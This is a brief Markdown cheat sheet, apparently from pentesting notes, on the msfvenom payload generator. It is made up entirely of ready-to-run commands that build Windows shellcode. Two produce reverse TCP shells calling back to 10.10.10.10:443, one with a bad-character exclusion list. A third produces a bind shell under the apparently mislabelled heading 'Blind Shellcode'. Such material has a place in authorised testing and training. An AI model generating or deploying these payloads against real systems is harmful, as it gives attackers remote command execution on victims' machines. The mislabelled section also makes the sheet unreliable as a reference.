---
description: >-
  MSFvenom is a combination of Msfpayload and Msfencode, putting both of these
  tools into a single Framework instance. msfvenom replaced both msfpayload and
  msfencode as of June 8th, 2015.
---

# MSFvenom

## Types of Shellcode

### Generic Shellcode

```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e generic/none
```

### Windows Reverse TCP Shell (x86)

Only use this type if payload size is not a problem and you can't determine the bad chars.

```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"
```

### Blind Shellcode

```
msfvenom -p windows/shell_bind_tcp RHOST=10.11.11.11 LPORT=1337 -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f python
```
